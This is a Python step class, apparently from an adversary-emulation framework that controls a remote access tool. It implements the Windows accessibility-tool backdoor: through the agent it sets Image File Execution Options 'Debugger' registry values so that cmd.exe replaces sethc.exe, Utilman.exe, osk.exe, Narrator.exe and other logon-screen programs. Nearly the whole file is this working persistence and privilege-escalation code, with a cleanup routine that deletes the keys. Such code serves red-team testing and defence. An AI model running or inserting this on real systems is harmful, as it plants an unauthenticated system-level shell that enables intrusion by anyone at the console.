class DebugAttach(Step):
    """
    Description:
        This step modifies the registry on the  local target machine to attach a debugger (cmd.exe in this case)
        to an application.
    Requirements:
        Requires administrative access to the target machine.
    """
    attack_mapping = [('T1183', 'Defense Evasion'), ('T1183', 'Persistence'), ('T1183', 'Privilege Escalation'), ('T1059', 'Execution')]
    display_name = "Launch Application Under Debugger"
    summary = 'Modify registry to cause an executable to be loaded and run in the context of separate processes on the computer.  Typically used for persistence and privilege escalation.'

    preconditions = [("rat", OPRat({"elevated": True})),
                     ("host", OPHost(OPVar("rat.host")))]
    postconditions = [("regkey_g", OPRegKey({"host": OPVar("host")}))]

    postproperties = [
                      "regkey_g.key", "regkey_g.value", "regkey_g.data"]

    significant_parameters = ['host'] #Host is the significant parameter so it runs once per host

    postproperties = [
                      "regkey_g.key", "regkey_g.value", "regkey_g.dtype", "regkey_g.data"]

    @staticmethod
    def description(rat, host):
        return "Adding registry key on {}".format(host.hostname)

    @staticmethod
    async def action(operation, rat, host, regkey_g): #variables from pre- and postconditions go here

        IFEO_Key_g = "\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\""
        Program_g = ['sethc.exe', 'Utilman.exe', 'DisplaySwitch.exe', 'osk.exe', 'Narrator.exe', 'AtBroker.exe']
        Value_g = "Debugger"
        DebugProgram_g = "\"C:\\windows\\system32\\cmd.exe\""
        for Program_gi in Program_g:
            Debug_key = IFEO_Key_g + '\\' + Program_gi
            await operation.execute_shell_command(rat, *reg.add(key=Debug_key, value=Value_g, data=DebugProgram_g, force=True))
            regkey = await regkey_g({'host': host, 'key': Debug_key})
        return True


    @staticmethod
    async def cleanup(cleaner, regkey_g):
        for regkey in regkey_g:
            await cleaner.delete(regkey)
